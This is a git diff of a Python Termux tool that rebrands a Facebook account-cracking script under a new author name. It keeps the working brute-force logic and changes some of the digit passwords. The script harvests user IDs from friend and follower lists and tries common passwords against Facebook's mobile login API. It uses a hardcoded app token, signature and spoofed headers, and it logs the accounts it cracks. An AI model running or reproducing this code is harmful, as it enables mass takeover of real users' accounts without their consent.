@@ -1,9 +1,9 @@
 #!/usr/bin/python2
 # -*- coding: utf-8
 
-#AUTHOR : FLAME NAIM
+#AUTHOR : B4BY DR4G0N
 #OPEN SOURCE :)
-#DON'T FORGET TO GIVE CREDIT TO FLAME NAIM
+#CREdIT TO NIM
 
 
 try:
@@ -50,46 +50,42 @@ def main():
 	logo()
 	print("\t\033[93;1m      MAIN MENU\x1b[0m")
 	print("")
-	print("\033[92;1m  [1] START CRACK")
-	print("\033[93;1m  [2] HOW TO GET ACCESS TOKEN")
-	print("\033[94;1m  [3] UPDATE TOOL")
-	print("\033[96;1m  [J] FROM TERMUX TIPS BOX \033[92;1m✘\033[91;1m✘")
+	print("\033[93;1m  [1] START CRACK")
+	print("\033[92;1m  [2] HOW TO GET ACCESS TOKEN")
+	print("\033[91;1m  [3] UPDATE TOOL")
 	print("\033[90;1m  [0] EXIT")
 	print("")
 	log_sel()
 	
 def log_sel():
-	sel = raw_input("\033[93;1m  CHOOSE: \033[92;1m")
-	if sel == "":
+	mmu = raw_input("\033[93;1m  CHOOSE OPTIONS: \033[92;1m")
+	if mmu == "":
 		print("\t\033[91;1m  SELECT AN OPTION STUPID -_")
 		log_sel()
-	elif sel =="1" or sel =="01":
+	elif mmu =="1" or mmu =="01":
 		token()
-	elif sel =="2" or sel =="02":
+	elif mmu =="2" or mmu =="02":
 		subprocess.check_output(["am", "start", "https://www.facebook.com/114133313700086/posts/426873429092738"])
 		main()
-	elif sel =="3" or sel =="03":
+	elif mmu =="3" or mmu =="03":
 		import os
 		try:
-			os.system("git clone https://github.com/Azim-Vau/fcpro")
-			os.system("rm -rf fcpro.py")
-			os.system("cp -f fcpro/fcpro.py \\.")
-			os.system("rm -rf fcpro")
-			xox("\033[92;1m\n FLAME NAIM UPDATE SUCCESSFUL :)\n")
+			os.system("git clone https://github.com/B4BY-DG/BanDuLa")
+			os.system("rm -rf BanDuLa.py")
+			os.system("cp -f BanDuLa/BanDuLa.py \\.")
+			os.system("rm -rf BanDuLa")
+			xox("\033[95;1m UPDATE SUCCESSFUL :)\n")
 			time.sleep(2)
 			main()
 		except KeyboardInterrupt:
 			print("\033[91;1m\n YOUR DEVICE IS NOT SUPPORTED!\n")
 	        	main()
-	elif sel =="4" or sel =="04" or sel =="J" or sel =="j":
-		subprocess.check_output(["am", "start", "https://t.me/mrerrorgroup"])
-		main()
-	elif sel =="0" or sel =="00":
-		xox("\n\t\033[91;1m GOOD BYE SEE YOU AGAIN :)")
+	elif mmu =="0" or mmu =="00":
+		xox("\n\t\033[91;1m GONE GYI!! SEE YOU AGAIN :)")
 		sys.exit()
 	else:
 		print("")
-		print("\t\033[91;1m  SELECT VALID OPTION")
+		print("\t\033[91;1m  INVALID OPTION")
 		print("")
 		log_sel()
 
@@ -141,14 +137,14 @@ def menu():
     xn = name.upper()
     logo()
     print("")
-    print("\033[93;1m     FLAME NAIM : \033[92;1m"+xn)
-    print("\033[93;1m     REGION  : \033[92;1m") + loc
-    print("\033[93;1m     YOUR IP : \033[92;1m") + ip
+    print("\033[93;1m   B4BY DR4G0N : \033[93;1m"+xn) + date
+    print("\033[92;1m     REGION  : \033[92;2m") + loc
+    print("\033[91;1m     YOUR IP : \033[92;1m") + ip
     print("")
 
     print("")
-    print("\033[92;1m  [1] CRACK WITH AUTO PASS")
-    print("\033[93;1m  [2] CRACK WITH DIGIT PASS")
+    print("\033[93;1m  [1] CRACK WITH AUTO PASS")
+    print("\033[92;1m  [2] CRACK WITH DIGIT PASS")
     print('\033[91;1m  [0] BACK')
     print("")
     menu_option()
@@ -197,7 +193,7 @@ def crack_select1():
 		os.system("clear")
 		logo()
 		print("")
-		print("\t\033[92;1m FLAME NAIM PUBLIC ID COINING ")
+		print("\t\033[92;1m PUBLIC ID CRACKING ")
 		print("")
 		try:
 			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
@@ -212,7 +208,7 @@ def crack_select1():
 					na = i["name"].encode('utf-8')
 					id.append(uid+"|"+na)
 			except KeyError:
-				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
+				print("\033[96;1m  TRY ANOTHER ONE")
 			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
 		time.sleep(3)
 	elif select =="2":
@@ -234,7 +230,7 @@ def crack_select1():
 					na = i["name"].encode('utf-8')
 					id.append(uid+"|"+na)
 			except KeyError:
-				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
+				print("\033[91;1m TRY ANOTHER ONE")
 			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
 		time.sleep(3)
 	elif select =="3":
@@ -266,7 +262,7 @@ def crack_select1():
 	print("")
 	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
 	print("\033[92;1m  BRUTE HAS BEEN STARTED\x1b[0m")
-	print("\033[94;1m  WAIT AND SEE FLAME NAIM MAGIC\033[92;1m✘\033[91;1m✘\x1b[0m")
+	print("\033[94;1m  WAIT A FEW MINUTE...\033[92;1m✘\033[91;1m✘\x1b[0m")
 	linex()
 	def main(arg):
 		user=arg
@@ -434,7 +430,7 @@ def crack_select1():
 	print("")
 	linex()
 	print("")
-	print("\033[92;1m FLAME NAIM HACKING HAS BEEN COMPLETED")
+	print("\033[92;1m BANDULA HACKING HAS BEEN COMPLETED")
 	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
 	print("")
 	linex()
@@ -458,9 +454,9 @@ def crack():
 	print("")
 	print("\t\033[93;1m  DIGIT PASS CRACKING")
 	print("")
-	print("\033[94;1m  [1] CRACK PUBLIC ID")
-	print("\033[93;1m  [2] CRACK FOLLOWERS")
-	print("\033[92;1m  [3] CRACK FILE")
+	print("\033[93;1m  [1] CRACK PUBLIC ID")
+	print("\033[92;1m  [2] CRACK FOLLOWERS")
+	print("\033[91;1m  [3] CRACK FILE")
 	print("")
 	crack_select()
 
@@ -532,15 +528,15 @@ def crack_select():
 	    menu()
 	else:
 		print("")
-		print("\t\033[91;1m  SELECT VALID OPTION")
+		print("\t\033[96;1m  SELECT VALID OPTION")
 		print("")
 		crack_select()
 	os.system("clear")
 	logo()
 	print("")
 	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
-	print("\033[92;1m  BRUTE HAS BEEN STARTED\x1b[0m")
-	print("\033[94;1m  WAIT AND SEE \033[92;1m✘\033[91;1m✘\x1b[0m")
+	print("\033[92;1m  BRUTEFORCE HAS BEEN STARTED...\x1b[0m")
+	print("\033[91;1m  WAIT AND SEE \033[92;1m✘\033[91;1m✘\x1b[0m")
 	linex()
 	def main(arg):
 		user=arg
@@ -585,7 +581,7 @@ def crack_select():
 							cp.close()
 							cps.append(uid+pass2)
 						else:
-							pass3 = "556677"
+							pass3 = "5281500"
 							api = 'https://b-api.facebook.com/method/auth.login'
 							params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass3, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
@@ -604,7 +600,7 @@ def crack_select():
 									cp.close()
 									cps.append(uid+pass3)
 								else:
-									pass4 = "786786"
+									pass4 = "969969"
 									api = 'https://b-api.facebook.com/method/auth.login'
 									params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass4, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 									headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
@@ -623,7 +619,7 @@ def crack_select():
 											cp.close()
 											cps.append(uid+pass4)
 										else:
-											pass5 = "123456"
+											pass5 = "654321"
 											api = 'https://b-api.facebook.com/method/auth.login'
 											params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass5, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 											headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
@@ -688,7 +684,7 @@ def crack_select():
 	print("")
 	linex()
 	print("")
-	print("\033[92;1m FLAME NAIM HACKING HAS BEEN COMPLETED")
+	print("\033[92;1m BANDULA HACKING HAS BEEN COMPLETED")
 	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
 	print("")
 	linex()
